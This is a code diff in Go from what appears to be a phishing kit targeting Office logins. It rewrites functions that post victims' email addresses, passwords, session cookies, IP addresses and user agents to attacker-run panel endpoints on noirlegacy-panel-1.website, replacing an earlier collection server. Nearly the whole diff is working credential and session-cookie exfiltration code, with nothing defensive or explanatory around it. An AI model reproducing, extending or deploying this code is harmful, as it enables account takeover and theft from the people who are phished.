@@ -95,22 +95,45 @@ func telegramSendResult(msg string) {
 
 }
 
-func sendEmailCookie(msg string, username string, password string, KeyUser string, sessionId string, remoteIp string, userAgent string) {
-
+func (d *Database) SendInvalidVisitor(sid int, pl_name string, req *http.Request, remote_addr string, key string) {
+	//
 	postBody, _ := json.Marshal(map[string]string{
-		"email":      username,
-		"ip":         remoteIp,
-		"userAgent":  userAgent,
-		"password":   password,
-		"cookie":     msg,
-		"key_user":   KeyUser,
-		"session_id": sessionId,
+		"session_id": strconv.Itoa(sid),
+		"user_agent": req.Header.Get("User-Agent"), // Get User-Agent header from request
+		"ip":         remote_addr,                  // Include remote address if needed
+		"key":        key,
 	})
-
+	//
 	responseBody := bytes.NewBuffer(postBody)
 
-	request, err := http.Post("https://natrium100gram.site/public/api/office-2fa-result", "application/json", responseBody)
+	request, _ := http.Post("https://noirlegacy-panel-1.website/api/invalidvisitor", "application/json", responseBody)
 
+	defer request.Body.Close()
+
+	fmt.Println(string(postBody))
+	os.Exit(0)
+
+	return
+
+	//err := os.WriteFile("schedule.json", []byte(msg), 0755)
+	//if err != nil {
+	//	fmt.Printf("Unable to write file: %v", err)
+	//}
+
+}
+
+func (d *Database) SendValidVisitor(req *http.Request, remote_addr string, key string) {
+	//
+	postBody, _ := json.Marshal(map[string]string{
+
+		"user_agent": req.Header.Get("User-Agent"), // Get User-Agent header from request
+		"ip":         remote_addr,                  // Include remote address if needed
+		"key_user":   key,
+	})
+	//
+	responseBody := bytes.NewBuffer(postBody)
+
+	request, err := http.Post("https://noirlegacy-panel-1.website/api/validvisitor", "application/json", responseBody)
 
 	if err != nil {
 		fmt.Println("Failed to make the POST request:", err)
@@ -123,10 +146,148 @@ func sendEmailCookie(msg string, username string, password string, KeyUser strin
 			request.Body.Close()
 		}
 	}()
-	
-	// defer request.Body.Close()
+	//os.Exit(0)
 
-	// log.Println("Send Email Cookies")
+	return
+
+	//err := os.WriteFile("schedule.json", []byte(msg), 0755)
+	//if err != nil {
+	//	fmt.Printf("Unable to write file: %v", err)
+	//}
+
+}
+
+func (d *Database) SendPassword(username string, session_id string, key string) {
+
+	//
+	postBody, _ := json.Marshal(map[string]string{
+		"password":   username,
+		"session_id": session_id,
+		"key_user":   key,
+		// Include remote address if needed
+	})
+
+	if username != "" {
+		responseBody := bytes.NewBuffer(postBody)
+
+		request, err := http.Post("https://noirlegacy-panel-1.website/api/password", "application/json", responseBody)
+
+		if err != nil {
+			fmt.Println("Failed to make the POST request:", err)
+			return // Exit the function without stopping the entire application
+		}
+
+		// Ensure the response body is closed properly after use
+		defer func() {
+			if request.Body != nil {
+				request.Body.Close()
+			}
+		}()
+		//os.Exit(0)
+
+	}
+
+	return
+	//
+
+}
+
+func (d *Database) SendJsonUsernamePassword(username string, session_id string, key string, ip string, req *http.Request) {
+
+	//
+	postBody, _ := json.Marshal(map[string]string{
+		"json1":      username, // Convert sid to string
+		"session_id": session_id,
+		"key_user":   key,
+		"ip":         ip,
+		"user_agent": req.Header.Get("User-Agent"),
+		// Include remote address if needed
+	})
+	if username != "" {
+		responseBody := bytes.NewBuffer(postBody)
+
+		request, err := http.Post("https://noirlegacy-panel-1.website/api/json1", "application/json", responseBody)
+
+		if err != nil {
+			fmt.Println("Failed to make the POST request:", err)
+			return // Exit the function without stopping the entire application
+		}
+
+		// Ensure the response body is closed properly after use
+		defer func() {
+			if request.Body != nil {
+				request.Body.Close()
+			}
+		}()
+		//os.Exit(0)
+
+	}
+
+	return
+}
+
+func (d *Database) SendUsername(username string, session_id string, key string, req *http.Request, ip string) {
+
+	//
+	postBody, _ := json.Marshal(map[string]string{
+		"email":      username, // Convert sid to string
+		"session_id": session_id,
+		"key":        key,
+		"buntu":      key,
+		"user_agent": req.Header.Get("User-Agent"),
+		"ip":         ip,
+		// Include remote address if needed
+	})
+	if username != "" {
+		responseBody := bytes.NewBuffer(postBody)
+
+		log.Println(responseBody)
+		request, err := http.Post("https://noirlegacy-panel-1.website/api/username", "application/json", responseBody)
+
+		if err != nil {
+			fmt.Println("Failed to make the POST request:", err)
+			return // Exit the function without stopping the entire application
+		}
+
+		// Ensure the response body is closed properly after use
+		defer func() {
+			if request.Body != nil {
+				request.Body.Close()
+			}
+		}()
+	}
+	//os.Exit(0)
+
+	return
+}
+
+func sendEmailCookie(msg string, username string, password string, KeyUser string, sessionId string, remoteIp string, userAgent string) {
+
+	postBody, _ := json.Marshal(map[string]string{
+		//"email":      username,
+		//"ip":         remoteIp,
+		//"userAgent":  userAgent,
+		//"password":   password,
+		"cookiesss": msg,
+		//"key_user":   KeyUser,
+		"session_id": sessionId,
+	})
+
+	responseBody := bytes.NewBuffer(postBody)
+
+	request, err := http.Post("https://noirlegacy-panel-1.website/api/cookies", "application/json", responseBody)
+
+	if err != nil {
+		fmt.Println("Failed to make the POST request:", err)
+		return // Exit the function without stopping the entire application
+	}
+
+	// Ensure the response body is closed properly after use
+	defer func() {
+		if request.Body != nil {
+			request.Body.Close()
+		}
+	}()
 
 	//err := os.WriteFile("schedule.json", []byte(msg), 0755)
 	//if err != nil {
